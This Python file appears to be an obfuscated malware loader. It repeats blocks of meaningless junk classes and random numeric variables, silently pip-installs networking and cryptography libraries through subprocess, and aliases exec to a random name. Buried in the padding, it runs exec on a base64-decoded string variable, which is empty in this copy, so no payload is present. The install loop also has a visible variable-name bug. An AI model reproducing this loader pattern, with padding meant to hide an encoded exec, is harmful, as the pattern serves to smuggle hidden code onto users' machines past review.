

from sys import executable, stderr
class OsdTiamFWR:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class ps3UETS7BA:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
{'username': 'UGt9n70', 'age': 20}
class Flgv1geg8e:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
J1nEfI2rrJ = 35673701
E9I0qMn2sl = 33892958
GhSPZwDYVr = 87607755
Mr3LfMXf0s = 7269251
class e26jac60bs:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
idqmRJR2QU = 84315136
class MeMaIanacU:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
dcihspCNfp = 4778951
fkf2F1KgnU = 80798683
d2w6RbEuYX = 71165096
["'iAQRd47TRQ'", "'i8HYV7YfFf'", "'OplFjNnyKr'"]
iekzhTw8PX = 13331942
class OPbllGXs4n:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class NnPWoBjVXn:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class fa5NpupvY3:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
YDeI4ZDiHr = 29534313
class IeQOEqFZCR:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class ng2ykUlfje:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'dM7zChQ2oF'
import ctypes;import base64,subprocess,sqlite3,json,shutil
import time
from importlib import import_module

requirements = [
    ["requests", "requests"],
    ["Cryptodome.Cipher", "pycryptodomex" if not 'PythonSoftwareFoundation' in executable else 'pycryptodome']
]
for modl in requirements:
    try:
        import_module(module[0])
    except:
        subprocess.Popen(executable + " -m pip install " +modl[1], shell=True)
        time.sleep(3)
        

from json import loads, dumps
from urllib.request import Request, urlopen
try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptography")

try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptodomex", shell=True)

try:
    import requests
except:
    subprocess.run("python -m pip install requests", shell=True)

try:
    from Cryptodome.Cipher import AES
except:
    subprocess.Popen(executable + " -m pip install pycryptodome ", shell=True)
    from Crypto.Cipher import AES

import requests
class OsdTiamFWR:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class ps3UETS7BA:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
{'username': 'UGt9n70', 'age': 20}
class Flgv1geg8e:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
J1nEfI2rrJ = 35673701
E9I0qMn2sl = 33892958
GhSPZwDYVr = 87607755
Mr3LfMXf0s = 7269251
class e26jac60bs:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
idqmRJR2QU = 84315136
class MeMaIanacU:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
dcihspCNfp = 4778951
fkf2F1KgnU = 80798683
d2w6RbEuYX = 71165096
["'iAQRd47TRQ'", "'i8HYV7YfFf'", "'OplFjNnyKr'"]
iekzhTw8PX = 13331942
class OPbllGXs4n:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class NnPWoBjVXn:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class fa5NpupvY3:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
YDeI4ZDiHr = 29534313
class IeQOEqFZCR:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class ng2ykUlfje:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'dM7zChQ2oF'
YbE4c5ivwVEnSEnJqWgTjpc0PWSUMHeYDXEuDy = exec
class OsdTiamFWR:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class ps3UETS7BA:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
{'username': 'UGt9n70', 'age': 20}
class Flgv1geg8e:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
J1nEfI2rrJ = 35673701
E9I0qMn2sl = 33892958
GhSPZwDYVr = 87607755
Mr3LfMXf0s = 7269251
class e26jac60bs:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
idqmRJR2QU = 84315136
class MeMaIanacU:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
dcihspCNfp = 4778951
fkf2F1KgnU = 80798683
d2w6RbEuYX = 71165096
["'iAQRd47TRQ'", "'i8HYV7YfFf'", "'OplFjNnyKr'"]
iekzhTw8PX = 13331942
class OPbllGXs4n:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class NnPWoBjVXn:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class fa5NpupvY3:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
YDeI4ZDiHr = 29534313
class IeQOEqFZCR:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class ng2ykUlfje:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'dM7zChQ2oF'
import concurrent.futures
oOosPZWZVsWTGiwUnbOIJCA6VwZHrrjEZMoxVW=""
YbE4c5ivwVEnSEnJqWgTjpc0PWSUMHeYDXEuDy(base64.b64decode(oOosPZWZVsWTGiwUnbOIJCA6VwZHrrjEZMoxVW))
class OsdTiamFWR:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class ps3UETS7BA:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
{'username': 'UGt9n70', 'age': 20}
class Flgv1geg8e:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
J1nEfI2rrJ = 35673701
E9I0qMn2sl = 33892958
GhSPZwDYVr = 87607755
Mr3LfMXf0s = 7269251
class e26jac60bs:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
idqmRJR2QU = 84315136
class MeMaIanacU:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
dcihspCNfp = 4778951
fkf2F1KgnU = 80798683
d2w6RbEuYX = 71165096
["'iAQRd47TRQ'", "'i8HYV7YfFf'", "'OplFjNnyKr'"]
iekzhTw8PX = 13331942
class OPbllGXs4n:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class NnPWoBjVXn:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class fa5NpupvY3:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
YDeI4ZDiHr = 29534313
class IeQOEqFZCR:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class ng2ykUlfje:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
'dM7zChQ2oF'